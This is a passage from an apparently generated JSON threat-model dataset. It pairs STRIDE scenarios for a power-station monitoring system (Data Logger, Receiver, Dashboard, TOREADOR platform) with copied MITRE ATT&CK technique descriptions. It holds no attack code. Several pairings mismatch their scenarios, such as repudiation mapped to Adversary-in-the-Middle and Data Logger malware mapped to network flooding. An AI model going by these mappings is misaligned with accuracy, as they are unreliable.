                "description": "Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.\n\nMost cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019)\n\nIf adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)\n\nThe de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.\n",
                "id": "attack-pattern--19bf235b-8620-4997-b5b4-94e0659ed7c3",
                "technique_id": "T1552.005"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits vulnerabilities in TOREADOR platform to access training data.",
            "Assumptions": [
                {
                    "Assumption": "Presence of unpatched vulnerabilities in the platform.",
                    "Role": "Security Administrator",
                    "Condition": "Delayed or missed patches and updates"
                },
                {
                    "Assumption": "Insufficient audit and monitoring.",
                    "Role": "System Administrator",
                    "Condition": "Lack of continuous monitoring and logging"
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive training data and potential exfiltration.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "platform",
                "vulnerability",
                "training data"
            ],
            "mitre_technique": {
                "name": "Vulnerabilities",
                "description": "Adversaries may acquire information about vulnerabilities that can be used during targeting. A vulnerability is a weakness in computer hardware or software that can, potentially, be exploited by an adversary to cause unintended or unanticipated behavior to occur. Adversaries may find vulnerability information by searching open databases or gaining access to closed vulnerability databases.(Citation: National Vulnerability Database)\n\nAn adversary may monitor vulnerability disclosures/databases to understand the state of existing, as well as newly discovered, vulnerabilities. There is usually a delay between when a vulnerability is discovered and when it is made public. An adversary may target the systems of those known to conduct vulnerability research (including commercial vendors). Knowledge of a vulnerability may cause an adversary to search for an existing exploit (i.e. [Exploits](https://attack.mitre.org/techniques/T1588/005)) or to attempt to develop one themselves (i.e. [Exploits](https://attack.mitre.org/techniques/T1587/004)).",
                "id": "attack-pattern--2b5aa86b-a0df-4382-848d-30abea443327",
                "technique_id": "T1588.006"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A DDoS attack on the Dashboard, making it inaccessible for maintenance teams.",
            "Assumptions": [
                {
                    "Assumption": "Servers are not capable of handling high volumes of requests.",
                    "Role": "Infrastructure Engineer",
                    "Condition": "Insufficient server capacity or DDoS protection"
                },
                {
                    "Assumption": "No rate-limiting measures in place.",
                    "Role": "Developer",
                    "Condition": "Absence of rate-limiting configuration"
                }
            ],
            "Potential Impact": "Temporary loss of access to critical system management and insights.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "dashboard",
                "request volume"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware infects Data Logger, stopping data collection from sensors.",
            "Assumptions": [
                {
                    "Assumption": "Lack of anti-malware software on the Data Logger.",
                    "Role": "Field Operator",
                    "Condition": "No anti-malware installed"
                },
                {
                    "Assumption": "No regular updates or patches for Data Logger software.",
                    "Role": "Vendor",
                    "Condition": "Delayed software updates"
                }
            ],
            "Potential Impact": "Disruption in data collection leading to gaps in monitoring and predictive analysis.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "malware",
                "data logger",
                "data collection"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker targets the LIGHT ICT infrastructure with a flooding attack.",
            "Assumptions": [
                {
                    "Assumption": "Network lacks intrusion detection and prevention systems.",
                    "Role": "Network Administrator",
                    "Condition": "Absence of detection and prevention mechanisms"
                },
                {
                    "Assumption": "No redundancy or failover solutions.",
                    "Role": "Infrastructure Engineer",
                    "Condition": "Lack of backup systems"
                }
            ],
            "Potential Impact": "Complete unavailability of LIGHT ICT services, impacting data processing and availability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "flooding attack",
                "network",
                "redundancy"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a zero-day in the TOREADOR platform to gain admin access.",
            "Assumptions": [
                {
                    "Assumption": "Presence of unpatched zero-day vulnerabilities.",
                    "Role": "Security Administrator",
                    "Condition": "Missed patches and updates"
                },
                {
                    "Assumption": "Weak administrative access controls.",
                    "Role": "System Administrator",
                    "Condition": "Lack of robust access policies"
                }
            ],
            "Potential Impact": "Unauthorized administrative access, leading to potential data breaches and manipulation.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "zero-day",
                "admin access",
                "platform"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An insider escalates privileges to access confidential AI/ML model data.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient monitoring of user actions.",
                    "Role": "Security Analyst",
                    "Condition": "Lack of anomaly detection mechanisms"
                },
                {
                    "Assumption": "Weak role-based access control.",
                    "Role": "System Administrator",
                    "Condition": "Ineffective implementation of access controls"
                }
            ],
            "Potential Impact": "Unauthorized access and potential exfiltration of sensitive AI/ML model data.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "insider threat",
                "access control",
                "AI/ML model"
            ],
            "mitre_technique": {
                "name": "Valid Accounts",
                "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)",
                "id": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
                "technique_id": "T1078"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Remote attacker exploits unprotected API endpoints to gain higher privileges.",
            "Assumptions": [
                {
                    "Assumption": "Lack of authentication and authorization for API calls.",
                    "Role": "Developer",
                    "Condition": "No security layers for API access"
                },
                {
                    "Assumption": "No regular security audits on API endpoints.",
                    "Role": "Security Engineer",
                    "Condition": "Absence of regular API security assessments"
                }
            ],
            "Potential Impact": "Elevation of privileges leading to unauthorized actions and potential data breaches.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "API",
                "endpoint",
                "authentication"
            ],
            "mitre_technique": {
                "name": "External Remote Services",
                "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
                "technique_id": "T1133"
            }
        }
    ]
},
{
    "case_number": "9",
    "batch_number": "12",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker sends falsified data packets by impersonating one of the power station sensors to the Data Logger.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the network communication protocol between sensors and Data Logger.",
                    "Role": "Network Intruder",
                    "Condition": "Weak network security controls."
                },
                {
                    "Assumption": "The attacker can successfully mimic the sensor communication format.",
                    "Role": "Skilled Attacker",
                    "Condition": "Knowledge of sensor communication protocol."
                },
                {
                    "Assumption": "No mutual authentication between sensor and Data Logger.",
                    "Role": "Architect",
                    "Condition": "Lack of robust authentication mechanism."
                }
            ],
            "Potential Impact": "Unauthorized data injection can lead to inaccurate model predictions, impacting system integrity.",
            "MITRE ATT&CK Keywords": [
                "network",
                "device",
                "spoofing",
                "impersonation"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker poses as a legitimate user accessing the Dashboard to view sensitive operational status and maintenance predictions.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to employee credentials.",
                    "Role": "Insider Threat",
                    "Condition": "Credential theft or phishing."
                },
                {
                    "Assumption": "Insufficiently enforced multi-factor authentication (MFA).",
                    "Role": "System Administrator",
                    "Condition": "Weak authentication policies."
                },
                {
                    "Assumption": "Lack of rigorous logging and monitoring.",
                    "Role": "Security Analyst",
                    "Condition": "Inadequate security monitoring."
                }
            ],
            "Potential Impact": "Confidentiality breach allowing unauthorized access to sensitive information.",
            "MITRE ATT&CK Keywords": [
                "user",
                "authentication",
                "credential theft",
                "spoofing"
            ],
            "mitre_technique": {
                "name": "Steal Web Session Cookie",
                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
                "technique_id": "T1539"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "A malware-infected device impersonates the Data Logger to the Receiver, feeding manipulated data.",
            "Assumptions": [
                {
                    "Assumption": "The Data Logger is compromised through malware.",
                    "Role": "External Attacker",
                    "Condition": "Device vulnerability exploited."
                },
                {
                    "Assumption": "The Receiver does not verify the Data Logger's identity.",
                    "Role": "System Integrator",
                    "Condition": "Lack of mutual authentication."
                },
                {
                    "Assumption": "Existing network security measures fail to detect malware activities.",
                    "Role": "Security Team",
                    "Condition": "Weak malware detection mechanisms."
                }
            ],
            "Potential Impact": "Data corruption leading to malfunction in predictive maintenance and power optimization.",
            "MITRE ATT&CK Keywords": [
                "malware",
                "device",
                "data injection",
                "spoofing"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts and modifies data packets in transit from the Data Logger to the Receiver.",
            "Assumptions": [
                {
                    "Assumption": "Data is transmitted without encryption.",
                    "Role": "System Designer",
                    "Condition": "Use of insecure communication protocols."
                },
                {
                    "Assumption": "The attacker has access to the communication channel.",
                    "Role": "Network Intruder",
                    "Condition": "Compromised network."
                },
                {
                    "Assumption": "No integrity checks on the received data.",
                    "Role": "System Engineer",
                    "Condition": "Lack of data integrity verification."
                }
            ],
            "Potential Impact": "Compromise of data integrity affecting the accuracy of AI predictions.",
            "MITRE ATT&CK Keywords": [
                "interception",
                "data",
                "tampering",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains physical access to a sensor and alters its configurations or firmware.",
            "Assumptions": [
                {
                    "Assumption": "Sensors are deployed in inadequately secured physical locations.",
                    "Role": "Facility Manager",
                    "Condition": "Weak physical security controls."
                },
                {
                    "Assumption": "Sensor firmware is not tamper-resistant.",
                    "Role": "Hardware Designer",
                    "Condition": "Firmware lacks security features."
                },
                {
                    "Assumption": "Physical access controls are insufficient.",
                    "Role": "Security Team",
                    "Condition": "Lack of proper access control measures."
                }
            ],
            "Potential Impact": "Corrupted data leading to misleading maintenance alerts and suboptimal power flow optimization.",
            "MITRE ATT&CK Keywords": [
                "device",
                "firmware",
                "tampering",
                "physical access"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An insider modifies the AI/ML models or training data within the TOREADOR platform to produce erroneous predictions.",
            "Assumptions": [
                {
                    "Assumption": "The insider has access permissions to modify models or data.",
                    "Role": "Authorized User",
                    "Condition": "Insufficient internal access controls."
                },
                {
                    "Assumption": "Changes are not properly audited or logged.",
                    "Role": "System Administrator",
                    "Condition": "Lack of audit trails and logging."
                },
                {
                    "Assumption": "Security measures are insufficient to detect unauthorized changes.",
                    "Role": "Security Analyst",
                    "Condition": "Weak monitoring mechanisms."
                }
            ],
            "Potential Impact": "Incorrect predictive maintenance alerts and inefficient resource management, impacting operational efficiency.",
            "MITRE ATT&CK Keywords": [
                "insider",
                "data",
                "tampering",
                "model"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies having accessed the Dashboard to avoid responsibility for compromising sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "Access logs are either not maintained or are easily manipulable.",
                    "Role": "System Administrator",
                    "Condition": "Lack of reliable logging mechanisms."
                },
                {
                    "Assumption": "The system does not support non-repudiation techniques.",
                    "Role": "System Designer",
                    "Condition": "No non-repudiation safeguards in place."
                },
                {
                    "Assumption": "Multiple users share credentials.",
                    "Role": "Employees",
                    "Condition": "Poor credential management practices."
                }
            ],
            "Potential Impact": "Difficulty in holding the user accountable, leading to potential abuse and data breaches.",
            "MITRE ATT&CK Keywords": [
                "user",
                "repudiation",
                "logging",
                "accountability"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A system operator alters configurations or data within the Receiver and denies any changes if the system malfunctions.",
            "Assumptions": [
                {
                    "Assumption": "Configuration changes are not logged with sufficient detail.",
                    "Role": "System Administrator",
                    "Condition": "Insufficient logging of configuration changes."
                },
                {
                    "Assumption": "There is no automated change management system.",
                    "Role": "System Engineer",
                    "Condition": "Lack of automated change tracking."
                },
                {
                    "Assumption": "No access controls or versioning implemented.",
                    "Role": "System Designer",
                    "Condition": "Weak access control policies."
                }
            ],
            "Potential Impact": "System reliability is questioned, and troubleshooting becomes complex, affecting system availability.",
            "MITRE ATT&CK Keywords": [
                "configuration",
                "data",
                "repudiation",
                "system operator"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A data analyst tampers with training data and denies the modifications, causing inaccuracies in model predictions.",
            "Assumptions": [
                {
                    "Assumption": "Modifications are not tracked or logged.",
                    "Role": "Data Analyst",
                    "Condition": "Lack of data modification logging."
                },
                {
                    "Assumption": "Multiple analysts share data access credentials.",
                    "Role": "Data Team",
                    "Condition": "Inadequate access controls."
                },
                {
                    "Assumption": "Internal audits are not performed regularly.",
                    "Role": "Audit Team",
                    "Condition": "Weak internal audit practices."
                }
            ],
            "Potential Impact": "Tampered data reduces model performance, affecting predictive maintenance and efficiency.",
            "MITRE ATT&CK Keywords": [
                "data",
                "analyst",
                "repudiation",
                "modification"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
